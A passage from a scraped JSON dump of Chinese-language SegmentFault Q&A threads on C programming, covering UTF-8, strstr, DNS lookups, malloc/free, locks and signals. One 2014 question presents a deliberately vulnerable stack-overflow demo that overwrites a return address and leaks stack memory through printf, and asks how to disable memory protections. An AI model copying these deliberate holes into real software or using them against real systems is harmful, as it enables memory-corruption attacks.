utf-8字符的遍历。</p>\n<p>求高手解答.</p>\n<p>PS: 我是想从字符指针去遍历utf-8的字符哦，不是想做编码转换的.</p>\n</div>",
      "favourite": "6",
      "glance": "6.8k",
      "tags": [
        "linux",
        "c",
        "utf-8"
      ],
      "time": "2013-10-08",
      "title": "linux C 语言如何遍历 utf-8字符",
      "url": "https://segmentfault.com/q/1010000000316867"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000521936\">\n<p>推荐两个：</p>\n<ol>\n<li><p>开源项目的话推荐陈硕的muduo，代码风格很好，对用一些常用类有封装，而且陈硕的csdn博客有相关介绍。 <a href=\"https://github.com/chenshuo/muduo\" rel=\"nofollow\">https://github.com/chenshuo/muduo</a></p></li>\n<li><p><a href=\"https://github.com/yanyiwu/cppjieba\" rel=\"nofollow\">https://github.com/yanyiwu/cppjieba</a></p></li>\n</ol>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000325657\">\n<p>google protobuf ?</p>\n<p>借楼同求。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000328301\">\n<p><a href=\"https://fcitx-im.org/wiki/Fcitx\" rel=\"nofollow\">小企鹅输入法</a></p>\n<p><a href=\"https://github.com/lsegal/my_toy_compiler\" rel=\"nofollow\">某个Amazon工程师写的最简单的编译器</a></p>\n<p><a href=\"https://github.com/hzqtc/fmd\" rel=\"nofollow\">某个大牛写的豆瓣FM服务端</a> , 和 <a href=\"https://github.com/hzqtc/fmc\" rel=\"nofollow\">客户端</a></p>\n</div>",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000323272\">\n<p>求推荐c/c++开源小项目</p>\n</div>",
      "favourite": "12",
      "glance": "6.3k",
      "tags": [
        "c++",
        "c"
      ],
      "time": "2013-10-22",
      "title": "求推荐c/c++开源小项目",
      "url": "https://segmentfault.com/q/1010000000323272"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000334927\">\n<html><body>\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\nchar tracks[][80]=\n{\n    \"I left my heart in Harvard med school\",\n    \"Newark,Newark-a wonderful town\",\n    \"Dancing with a Dork\",\n    \"From here to maternity\",\n    \"The girl from two Jima\",\n};\nvoid find_track(char search_for[])\n{\n    int i;\n    for(i=0;i&lt;5;i++)\n    {\n        if(strstr(tracks[i],search_for))\n            printf(\"Track %i: '%s'\\n\",i+1,tracks[i]);      \n    }\n}\nint main()\n{\n    char search_for[80];\n    printf(\"Search for: \");\n    fgets(search_for,80,stdin);\n    find_track(search_for);\n    return 0;\n}\n</code></pre>\n<p>不管我输入什么字符串，strstr()函数返回的都是0，这是为什么呢？\n<img data-src=\"http://segmentfault.com/img/bVbzib\"/></p>\n</body></html>\n</div>",
      "favourite": "0",
      "glance": "2.1k",
      "tags": [
        "c",
        "c++",
        "程序员",
        "编程"
      ],
      "time": "2013-11-12",
      "title": "C语言中strstr()函数的使用问题",
      "url": "https://segmentfault.com/q/1010000000334927"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000343151\">\n<p>我想问2个问题，在提问前，我先进行下说明。<br/>\n在Linux下编译(gcc -o hostinfo  hostinfo.c)下面的代码后</p>\n<pre><code class=\"lang-cpp\">#include&lt;stdio.h&gt;\n#include&lt;netdb.h&gt;\n#include&lt;arpa/inet.h&gt;\n#include&lt;netinet/in.h&gt;\n\nint main(int argc, char **argv)\n{\n    if(argc != 2){\n         fprintf(stderr, \"usage: %s &lt;domain name or dotted-decimal&gt;\\n\", argv[0]);\n         return 0;\n    }\n\n   char **pp;\n   struct in_addr addr;\n   struct hostent *hostp;\n\n   if(inet_aton(argv[1], &amp;addr) != 0){\n       hostp = gethostbyaddr((const char *)&amp;addr, sizeof(addr), AF_INET);\n   }else{\n       hostp = gethostbyname(argv[1]);\n   }\n\n   printf(\"official hostname: %s\\n\", hostp-&gt;h_name);\n\n   for(pp = hostp-&gt;h_aliases; *pp != NULL; pp++){\n        printf(\"alias: %s\\n\", *pp);\n   }\n\n   for(pp = hostp-&gt;h_addr_list; *pp != NULL; pp++){\n        addr.s_addr = ((struct in_addr *) *pp)-&gt;s_addr;\n        printf(\"address: %s\\n\", inet_ntoa(addr));\n   }\n\n   return 0;\n}\n</code></pre>\n<p>运行命令:</p>\n<pre><code>&gt;./hostinfo www.17173.com\n&gt;./hostinfo www.17173.com\n</code></pre>\n<p>得到结果如下:</p>\n<pre><code>official hostname: poolct.17173.com\nalias: www.17173.com\nalias: pooldist.17173.com\naddress: 117.27.230.84\naddress: 117.27.230.82\naddress: 117.27.230.83\naddress: 117.27.230.98\naddress: 117.27.230.75\naddress: 117.27.230.86\naddress: 117.27.230.85\naddress: 117.27.230.80\naddress: 117.27.230.99  \n\nofficial hostname: poolct.17173.com\nalias: www.17173.com\nalias: pooldist.17173.com\naddress: 117.27.230.83\naddress: 117.27.230.82\naddress: 117.27.230.84\naddress: 117.27.230.96\naddress: 117.27.230.75\naddress: 117.27.230.88\naddress: 117.27.230.85\naddress: 117.27.230.80\naddress: 117.27.230.99\n</code></pre>\n<p>现在我想请问2个问题：<br/>\nA.为什么每次返回的 ip 地址的顺序不一样？<br/>\nB.这种顺序有何作用?</p>\n</div>",
      "favourite": "2",
      "glance": "3.4k",
      "tags": [
        "c",
        "网络",
        "linux"
      ],
      "time": "2013-11-25",
      "title": "一个域名对应多个 IP",
      "url": "https://segmentfault.com/q/1010000000343151"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000408317\">\n<p>开发手游个人觉得c++是最合适，可参考开源引擎cocos2d-x，一套代码跨iOS和安卓两个平台，配合脚本语言lua或者js，一周入门，一个月出小游戏都是没问题的。<br>\n如果使用c，可参考云风的开源ejoy2d，自己封装opengl，集成脚本lua。<br>\n当然还有u3d，虚幻等等其他可以参考，无外乎底层c、c++，或者配合脚本语言使用，或者直接c/c++，所以不知道楼主得瑟了没，如果还没有，就开始c/c++和opengl之旅吧。。。</br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000359176\">\n<p>理论上什么纸都可以擦屁股，只不过卫生纸更具有针对性，如果你非要用<del>打印纸</del>（磨砂纸）擦的话。。也不是不行。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000358860\">\n<p>首先，php不太适合</p>\n<p>理论上，一门语言可以干好多事情，但是还是用适合的语言做适合的事情</p>\n<p>比如你要在android上开发用java最好</p>\n<p>ios上开发 Objective-c  最好</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000358746\">\n<p>作为一只有节操的菜鸟：之前一听到安卓就听到java，以为java是在安卓上开发的独家语言；直到刚才，回头一看猛然发现，html5也可以在安卓手机上开发游戏<br/>\n我很喜欢玩手机游戏，我也很想以后做出一款手机游戏给我好基友们得瑟的瑟〉。《<br/>\n我最近在学php，不知道可不可以用php做出来？如果能的话需要到什么程度？用c能不能？开发手游是不是什么语言都可以</p>\n</div>",
      "favourite": "1",
      "glance": "5.7k",
      "tags": [
        "php",
        "c"
      ],
      "time": "2013-12-12",
      "title": "开发手游是不是什么语言都可以",
      "url": "https://segmentfault.com/q/1010000000358746"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000402197\">\n<p>抢答！<br>\nbiter &lt;= citer 也就是说缺少的数在b数组里。所以re += v！<br>\n事实上编程珠玑里的意思是要用文件来分成两个组。<br>\n也就是首位是0放进file0, 是1则放进file1.<br>\n重复这个过程，必然找到一个缺少的数。</br></br></br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000402212\">\n<p>二分是对的，算法看不懂</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000402024\">\n<p>好精妙的算法啊，太牛逼了，当时都没注意仔细看。有时间要把编程珠玑再看一遍。<br>\nre最开始是零，如果在某一位上是1的数字大于是0的数字，则把这一位的re置为0。在for循环中，将a的所有数字，按照某一位为零还是为一分成了两部分，也就是b数组和c数组，然后在后面交换b或c和a的位置，在下一个while循环里面处理数字更少的位数。re负责标记，如果某一位为1的数字更多，则这以为标记为0，如果为0的多，标记为1（什么也不做）。最后的re是一个32位的数，他的每一位都是更少的一位，所以它自己本身一定是不存在的。<br>\n这个问题本身只要求找出一个不存在的数，很好奇，能不能用这个思想找出所有不存在的数。</br></br></p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000359749\">\n<p>编程珠玑里的问题：<br/>\nA题：给定一个最多包含40亿个随机排列的32位整数的顺序文件，找出一个不在文件中的32位整数。<br/>\n    3、如果内存不足，仅可以用文件来进行处理，如何处理？</p>\n<p>文中指出用二分法， 看到一段代码是这样写的（<a href=\"http://www.2cto.com/kf/201205/131442.html\" rel=\"nofollow\">http://www.2cto.com/kf/201205/131442.html</a>）：</p>\n<pre><code>int split(int* a, int* b, int*c, int alen, int bit)\n{\n    int biter, citer, i;\n    int v=0, re = 0, *t;\n\n    while(bit--){\n        v = (1 &lt;&lt; bit);\n        for(i=biter=citer=0; i &lt; alen; i++) {\n            if(a[i] &amp; (1&lt;&lt;bit)) {\n                b[biter++] = a[i];\n            } else {\n                c[citer++] = a[i];\n            }\n        }\n        if(biter &lt;= citer) {\n            re += v;\n            t = a;\n            a = b;\n            b = t;\n            alen = biter;\n        } else {\n            t = c;\n            c = a;\n            a = t;\n            alen = citer;\n        }\n    }\n    return re;\n}\n</code></pre>\n<p>说明： a, b, c,都是三个等长的数组，alen表示其长度。bit表示位数。比如32位。bit=32.<br/>\nre表示最后缺少的那个数。</p>\n<p>问题： 为什么是  <strong>re += v;</strong>， v = 1 &lt;&lt; bit, 也就是2的bit次方, 用re累加v意义是纳尼， bitmap不是通过位置来表示value吗，比如00000...1000表示的是4，搞不懂这里的<code>re += v;</code> 求解</p>\n</div>",
      "favourite": "5",
      "glance": "6k",
      "tags": [
        "c",
        "算法"
      ],
      "time": "2013-12-13",
      "title": "给定一个最多包含40亿个随机排列的32位整数的顺序文件，找出一个不在文件中的32位整数。",
      "url": "https://segmentfault.com/q/1010000000359749"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000367245\">\n<p>1和3回答的很清楚了，就补充下第二点：<br/>\nC语言标准库中，free函数原型是：<br/>\nvoid free (void* ptr);<br/>\nC语言标准中，void*和所有指向各种数据的指针都和char *一致，包括大小，对齐方式。<br/>\n所以在数据指针之间进行各种转换是没有问题的。</p>\n<p>但是请注意：C语言标准并未规定数据指针和函数指针是一样的，这是未定义行为。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000362339\">\n<ol>\n<li><p>malloc() 分配的内存块中包含一个<code>头块</code>，用来记录分配内存的大小等信息，free()会读取这个块，对内存进行释放。</p></li>\n<li><p>分配 int 类型内存大小，而只释放一半的空间（这里假设 int 为2字节），所以，当多余的内存持续增加时，占满内存空间，就会导致内存泄漏。</p></li>\n<li><p>这种释放方法是错误的，确定书中是这么写的吗？正确的写法应该是：</p></li>\n</ol>\n<pre><code class=\"lang-cpp\">for(p = head; p != NULL; p = q){\n    q = p-&gt;next;\n    free(p);\n    }\n</code></pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000361517\">\n<ol>\n<li>（glibc 的）malloc 等函数在分配时会记录每块内存的起始位置和大小</li>\n<li>看你加 C++ 标签了，但问的问题似乎仅仅是 C。在 C 语言中，一般是不转换 malloc 的返回值的类型的。通常情况下不会有问题。当 <code>char*</code> 的大小比 <code>int*</code> 小时由于整型截断，会出问题的（不是内存泄漏那么简单）。但是好像找不到这两种指针大小不一样的系统了吧？</li>\n<li><strong>永远不可行</strong>，因为它在逻辑上是错误的。一、另一线程可以在你访问之前使用了该内存块；二、内存分配器可以为了安全起见将已释放的内存清零；三、其它情况。</li>\n</ol>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000361508\">\n<p>1 一次性分配较大内存，free如何获知该内存大小并完全释放，实现机制是？</p>\n<p>2 如下代码：</p>\n<pre><code>int *p = (int*)malloc(sizeof(int));\nfree((char*)p);\n</code></pre>\n<p>什么情况下会出现内存泄漏？</p>\n<p>3 <code>&lt;c prime&gt;</code>一书一个版本在高级数据结构一节中写过如下代码：</p>\n<pre><code>while(p != NULL){\n    free(p);\n    p = p-&gt;next;\n}\n</code></pre>\n<p>这样的用法是否永远可行？</p>\n</div>",
      "favourite": "3",
      "glance": "2.7k",
      "tags": [
        "c",
        "c++",
        "程序员"
      ],
      "time": "2013-12-16",
      "title": "c中free函数的一些问题探讨",
      "url": "https://segmentfault.com/q/1010000000361508"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000403501\">\n<p>现代的Java已经支持闭包了。</p>\n<p>标准的C不支持闭包。gcc和clang倒是有blocks扩展。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000431413\">\n<p>我想说 Java 的「闭包」很蛋疼... 被闭包引用的「域外」变量只能是 <code>final</code> 的，而且可读性很差，引用 <a href=\"https://code.google.com/p/guava-libraries/wiki/FunctionalExplained\" rel=\"nofollow\">guava</a>的一个例子，自己比较下：</p>\n<p>「二比青年版」：</p>\n<pre><code>Multiset&lt;Integer&gt; lengths = HashMultiset.create(\n  FluentIterable.from(strings)\n    .filter(new Predicate&lt;String&gt;() {\n       public boolean apply(String string) {\n         return CharMatcher.JAVA_UPPER_CASE.matchesAllOf(string);\n       }\n     })\n    .transform(new Function&lt;String, Integer&gt;() {\n       public Integer apply(String string) {\n         return string.length();\n       }\n     }));\n</code></pre>\n<p>这里 <code>Predicate</code> 和 <code>Function</code> 匿名类就是「闭包」，分别实现了 <code>Predicate</code> 接口和 <code>Function</code> 接口。看看这一坨代码... Java 中慎用这种「编码模式」！</p>\n<p>「普通青年版」：</p>\n<pre><code class=\"lang-java\">Multiset&lt;Integer&gt; lengths = HashMultiset.create();\nfor (String string : strings) {\n  if (CharMatcher.JAVA_UPPER_CASE.matchesAllOf(string)) {\n    lengths.add(string.length());\n  }\n}\n</code></pre>\n<p>短平快，可读性好！</p>\n<p>「文艺青年版」：</p>\n<pre><code class=\"lang-clojure\">(-&gt;&gt; strings\n    (filter #(.matchesAllOf % CharMatcher/JAVA_UPPER_CASE))\n    (map #(.length %))\n    (HashMultiset/create))\n</code></pre>\n<p>当然，对于动态语言来说，太小菜了。</p>\n<p>以后 Java 8 普及了，支持 Lambda 表达式，估计会好一些。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000413654\">\n<p>c语言不熟悉，java中的闭包是通过“接口+内部类”实现的<br>\n以下是网上的一个例子</br></p>\n<pre><code class=\"lang-java\">public class DemoClass1 {\n    private int length =0;\n\n    //private|public\n    private class InnerClass implements ILog\n    {\n        @Override\n        public void Write(String message) {\n            //DemoClass1.this.length = message.length();\n            length = message.length();\n            System.out.println(\"DemoClass1.InnerClass:\" + length);\n        }\n    }\n\n    public ILog logger() {\n        return new InnerClass();\n    }\n\n    public static void main(String[] args){\n        DemoClass1 demoClass1 = new DemoClass1();\n        demoClass1.logger().Write(\"abc\");\n\n        //.new\n        DemoClass1 dc1 = new DemoClass1();\n        InnerClass ic = dc1.new InnerClass();\n        ic.Write(\"abcde\");\n    }\n}\n</code></pre>\n<p>可以参考下这个博客<a href=\"http://www.cnblogs.com/chenjunbiao/archive/2011/01/26/1944417.html\" rel=\"nofollow\">http://www.cnblogs.com/chenjunbiao/archive/2011/01/26/1944417.html</a></p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000403335\">\n<p>js go python 实现闭包貌似很简单</p>\n</div>",
      "favourite": "3",
      "glance": "3.3k",
      "tags": [
        "闭包",
        "c",
        "java"
      ],
      "time": "2014-02-05",
      "title": "c语言和java如何实现闭包？",
      "url": "https://segmentfault.com/q/1010000000403335"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000403358\">\n<p>请问在linux平台go语言和c语言分别写个程序，两者如何通信？</p>\n<p>假设go写webserver，c控制底层硬件（比如嵌入式）。我想实现web server将受到的指令给c程序，从而实现远程控制。</p>\n</div>",
      "favourite": "0",
      "glance": "3.5k",
      "tags": [
        "golang",
        "c"
      ],
      "time": "2014-02-05",
      "title": "go语言和c语言写的程序通信问题",
      "url": "https://segmentfault.com/q/1010000000403358"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000432116\">\n<pre><code>void foo(char *data){\n    char name[10];\n\n    printf(\"%p\\n%p\\n%p\\n%p\\n\");//打印当前程序栈内存\n    strcpy(name, data);//覆盖返回地址\n}\n\nvoid hack(void){\n    puts(\"another place\");\n}\n\nint main(){\n    char buf[10];\n    char buf2[10];\n\n    scanf(\"%s\", buf);\n    foo(buf);\n\n    return 0;\n}\n</code></pre>\n<p>以上是经典的缓冲区溢出攻击，当buf中输入超过10(16)字节，将会覆盖buf2中的内容;如果写入更多字节数，可以改变寄存器中保存的地址，使得被调用函数执行完成后返回到另一个函数的入口地址。</p>\n<p>问题：<br>\n    当前保护机制下，只能覆盖buf2中内容，但是即便跳过很长的内存保护的区域依然找不到记录被调函数返回地址的位置。1.在linux下不采用任何内存保护方法编译源代码的方法？2.关于现在内存保护机制下缓冲区溢出攻击的可能形式。</br></p>\n</div>",
      "favourite": "3",
      "glance": "1.8k",
      "tags": [
        "安全",
        "c++",
        "c",
        "程序员"
      ],
      "time": "2014-03-13",
      "title": "探讨主流内存保护机制下的缓冲区溢出攻击可行形式",
      "url": "https://segmentfault.com/q/1010000000432116"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000444923\">\n<p>我感觉内存越界的检查（或者说信号被发送）是在函数完成后才进行的，也就是调用函数的堆栈检查。<br>\n补充一个例子比较能说明问题：</br></p>\n<pre><code>void sigfunc(int sig) {\n    printf(\"recv a signal %d\\n\", sig);\n    abort();\n}\nvoid testmem(){\n    char sz[10] = {0};\n    printf(\"fun cpy begin 11111111\\n\");\n    strcpy(sz,\"hello wpjsolo,hello wpjsolo,hello wpjsolo\");\n    printf(\"fun cpy end 2222222\\n\");\n}\nint main(void) {\n    signal(SIGSEGV, sigfunc);\n    char sz[10] = {0};\n    printf(\"cpy begin 111111111\\n\");\n    strcpy(sz, \"hello liwq, hello liwq, hello liwq\");\n    printf(\"cpy end 2222222\\n\");\n    printf(\"pid %d\\n\", getpid());\n    printf(\"ok 1111111111\\n\");\n    sleep(3);\n    printf(\"ok 2222222222\\n\");\n    testmem();\n    sleep(5);\n    printf(\"ok 3333333333\\n\");\n    return 0;\n}\n</code></pre>\n<p>将在 testmem()运行后马上就abort()</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000488886\">\n<p>char sz是动态分配在堆栈上得，strcpy将超过sz大小的数据拷贝到堆栈上面去，导致堆栈的其他部分被所拷贝的内容覆盖。x86将调用函数的返回地址和堆栈指针也保存在堆栈上，由于上面的拷贝将保存在堆栈的数据改写，这样会导致堆栈上保存的调用函数返回地址或者指针指向无效的数据，这样在从被调用函数返回的时候，出发了无效地址访问，从而产生了非法内存访问的信号产生。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000445033\">\n<p>这是很正常的行为呀，看汇编（x86_64）（希望没弄错什么）：</p>\n<pre><code class=\"lang-asm\">        # 初始化 sz，8+2 个 0，占用 -32(%rbp) 到 -23(%rbp)\n    movq    $0, -32(%rbp)\n    movw    $0, -24(%rbp)\n    movl    $.LC1, %edi\n    call    puts\n        # 将 sz 的地址放入 %rax 中\n    leaq    -32(%rbp), %rax\n        # 复制字符串中...\n    movabsq $7596482334399685992, %rdx\n    movq    %rdx, (%rax)\n    movabsq $7812730951471755639, %rcx\n    movq    %rcx, 8(%rax)\n    movabsq $2318352665872703599, %rbx\n    movq    %rbx, 16(%rax)\n    movabsq $7596482334399685992, %rdx\n    movq    %rdx, 24(%rax)\n    movw    $29047, 32(%rax)\n    movb    $0, 34(%rax)\n        # 复制字符串完成，覆盖 -32(%rbp) 到 1(%rbp)。-23(%rbp) 到 1(%rbp) 的数据被覆盖，这里包括了函数返回地址等数据\n</code></pre>\n<p>所以直到 main 函数返回时才会发生内存访问违例，导致 SIGSEGV 信号的发送。硬件才不在乎你的访问有没有越界呢，它只关心你有没有权限访问指定的内存地址。</p>\n<hr>\n<p>另外，严格来讲，在信号处理函数里是不能调用 printf 等会导致内存分配的函数的，因为信号处理是异步的，你需要假设它在任意时候都可能被执行。如果你的程序正好在执行 malloc 之类的函数，锁住了 C 标准库的内存分配用的数据结构，你再次使用需要这个锁的函数就会导致死锁。所以信号处理函数中只能调用<strong><a href=\"http://learn.akae.cn/media/ch33s04.html#id2885983\" rel=\"nofollow\">可重入函数</a></strong>。</p>\n<p>又，你要处理 SIGSEGV 信号通常得使用另外分配的栈来处理，因为已有的函数栈已经坏掉不能用了。当然很少会有程序去费心思处理 SIGSEGV 的，最多记录一些日志而已。</p>\n</hr></div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000444883\">\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;string.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n\nvoid sigfunc(int sig) {\n    printf(\"recv a signal %d\\n\", sig);\n    abort();\n}\nint main(void) {\n    signal(SIGSEGV, sigfunc);\n    char sz[10] = {0};\n    printf(\"cpy begin 111111111\\n\");\n    strcpy(sz, \"hello liwq, hello liwq, hello liwq\");\n    printf(\"cpy end 2222222\\n\");\n    printf(\"pid %d\\n\", getpid());\n    printf(\"ok 1111111111\\n\");\n    sleep(3);\n    printf(\"ok 2222222222\\n\");\n    sleep(500);\n    printf(\"ok 3333333333\\n\");\n    return 0;\n}\n</code></pre>\n<p>不知道是和系统有关系么？在我的机器上运行到结束以后才会处理内存越界的信号。<br>\n信号是在内核态向用户态切换前处理的吧，那这段代码就没有切换到内核态运行过么，sleep了这么久，就一直占用CPU，没有被调度过么？请大神们帮解答一下！！！</br></p>\n</div>",
      "favourite": "8",
      "glance": "2.5k",
      "tags": [
        "c",
        "linux-kernel"
      ],
      "time": "2014-03-25",
      "title": "信号是在什么时候被处理的？内存越界后程序是怎么运行的呢？",
      "url": "https://segmentfault.com/q/1010000000444883"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000500173\">\n<p>首先，malloc只负责分配空间，但不会对空间进行初始化；其次，<code>index</code>变量保存的是一个地址，你可以想象为一个64位整数，你一直<code>index++</code>，为啥会期望<code>index+4</code>就是<code>NULL</code>呢；最后，即使使用<code>(*index) != NULL</code>也是错的，因为你是在地址偏移量0 ~ N-1上分配了空间，并不能保证偏移量为N的位置的内容就是NULL啊，所以第一段代码的用法是错的。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000500247\">\n<p>malloc只是给出一段空间的首地址不假，但是：<br>\n1. 它不会为你初始化这段内存中的任何值<br>\n2. 它只保证从你申请到的地址开始知道你所申请的长度的偏移之间的空间给你安全使用</br></br></p>\n<p>所以：<br>\n将任何内存位置上的值<code>以数值类型打印出来</code>，和它本身是不是被某个user使用根本没有关系，<strong>如果</strong>malloc或者其他内存分配函数都能带有问题中所设想的<strong><em>NULL</em></strong>区域，大量的软件bug就会早早暴露出来了。</br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000500261\">\n<ol>\n<li>\n<code>malloc</code>不会在分配的内存的下一个字节补上NULL，它也不会初始化内存为NULL，它只是在堆上开辟一块空间。</li>\n<li>\n<code>free</code>会回收已分配的内存，它只是把一段内存重新标记为可用。但是<code>str</code>的值还是没变的，那么它指向的区域将是“invalid”的，也即是什么值都有可能。可能你的程序刚好只重新使用了前四位，所以后面几位还是保持原来的值不变。</li>\n</ol>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000500125\">\n<pre><code class=\"lang-C\">int main()\n{\n  char *str = (char*) malloc(3 * sizeof(char));\n  char *index = str;\n  long long count = 0;\n\n  while(index != NULL){\n    printf(\"%p\\n\", index++);\n    count ++;\n  }\n\n  printf(\"lld\\n\", count);\n}\n</code></pre>\n<p>在上面的代码中，我用<code>malloc</code>分配了3个字节的空闲内存。理论上(index+4)应该等于<code>NULL</code>，此时就应该停止循环，但是上面的代码会在while中不断的循环输出地址。<br>\n起初，我认为这应该是<code>malloc</code>只是给出一块内存空闲空间的首地址，并未限制空间的大小。而是由<code>free</code>函数根据malloc的参数来做回收，所以又试了下面的例子：</br></p>\n<pre><code>int main()\n{\n  char *str = (char*) malloc(5 * sizeof(char));\n  char *index = str;\n\n  for(int i = 0; i &lt; 10; i++){\n    *(index+i) = 'a';\n  }\n  //输出字符的ASCII码\n  for(int i = 0; i &lt; 10; i++){\n      printf(\"%d \", *(str+i));\n  }\n  printf(\"\\n\");\n\n  free((void*) str);\n\n  //输出字符的ASCII码\n  for(int i = 0; i &lt; 10; i++){\n    printf(\"%d \", *(str+i));\n  }\n}\n</code></pre>\n<p>实际的输出结果是这样的：</p>\n<pre><code>97 97 97 97 97 97 97 97 97 97\n0  0  0  0  97 97 97 97 97 97\n</code></pre>\n<p>无论怎样修改<code>malloc</code>中分配的字节数，总是前面的4个97变为0。<br>\n为什么会出现这样奇怪的结果？请大家帮我解释一下这个问题，感激不尽！！！</br></p>\n</div>",
      "favourite": "1",
      "glance": "1.6k",
      "tags": [
        "c"
      ],
      "time": "2014-05-09",
      "title": "malloc与free的疑惑",
      "url": "https://segmentfault.com/q/1010000000500125"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000505022\">\n<p>楼主需要的是进程(process)之间共共享内存，那么这个时候pthread无法帮忙，因为pthread是线程(thread)级别的锁。 进程之间共享内存一般通过memory mapped file来进行，参见mmap函数。如果需要枷锁操作，可以根据情况选用文件锁 fcntl,或者信号量(Semaphores) semget函数来进行读写的限制。<br>\n如果楼主本意是线程的话，那么pthread_rwlock应该就够了。</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000504725\">\n<p>一个读的信号量，一个写的信号量，读信号量初始化为0，写的信号量初始化为1。<br>\n读的时候先查看写是否为1，如果是，则将读信号量加1，完成后-1；若不是则表示现在不能读。写的时候先查看读的信号量是否为0，若为0，则将写的信号量-1；若不为0，就表示不能写，写完成后，写信号量加1.<br>\n记得以前学操作系统上面的</br></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000504719\">\n<p>这不就是读写锁么？<br>\n参见pthread_rwlock_init(3)，需要定义__USE_UNIX98或__USE_XOPEN2K<br>\n或者 <a href=\"http://en.cppreference.com/w/cpp/thread/shared_lock\" rel=\"nofollow\">http://en.cppreference.com/w/cpp/thread/shared_lock</a></br></br></p>\n<p>另外，你用mutex和condition_variable自己实现一个也不麻烦</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000504702\">\n<p>语言是c/c++</p>\n<p>需求是这样的，有一段共享内存大家都可以读，只有一个进程可以写，然后大家读都没有问题，但是写的时候必须所有人都不在读的时候才可以写。</p>\n<p>两组lock操作，第一组把一个ref+-1，然后允许读取。<br>\n第二组lock的时候先等待ref=0，这时候所有第一种lock会被堵塞，然后等ref=0开始读写这部分内存，unlock之后放行第一种lock。</br></p>\n<p>这种锁如何实现，或者说叫什么名字？</p>\n<p>我自己想的办法是另开一个进程，然后和这些进程建立一个socket，然后其他进程向这个进程请求资源，请求之后开始read，当资源空闲的时候就直接write，否则就加入一个cleanup队列，直到写入操作介绍之后再一起write，但是我感觉这样太浪费资源来的。。</p>\n</div>",
      "favourite": "0",
      "glance": "1.9k",
      "tags": [
        "linux",
        "锁",
        "c++",
        "c"
      ],
      "time": "2014-05-13",
      "title": "Linux下怎么实现这样的锁？",
      "url": "https://segmentfault.com/q/1010000000504702"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000535492\">\n<p>题主想通过看一些项目的代码来学习C/C++，可是自己写C/C++最多只写过一两个文件、几百行代码的项目，并且对于很多标准和习惯用法并不是很了解，直接去看那些比较有名的开源项目根本毫无头绪。<br>\n所以希望大家能推荐一些比较小的、容易看懂的项目。</br></p>\n</div>",
      "favourite": "2",
      "glance": "5.7k",
      "tags": [
        "编程",
        "c++",
        "c"
      ],
      "time": "2014-06-06",
      "title": "有哪些比较小的C/C++开源项目，适合初学者学习用的？",
      "url": "https://segmentfault.com/q/1010000000535492"
    },
    {
